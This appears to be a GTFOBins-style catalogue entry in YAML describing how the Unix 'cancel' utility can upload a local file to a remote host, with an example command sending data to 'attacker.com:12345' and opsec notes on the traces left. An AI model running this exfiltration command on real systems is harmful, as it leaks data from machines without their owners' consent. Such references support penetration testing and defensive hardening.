---
name: cancel
capabilities:
- upload
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: cancel -h attacker.com:12345 -u DATA
  notes: Data is sent as a POST request along with other content.
references:
- https://gtfobins.github.io/gtfobins/cancel/
tags: []
---
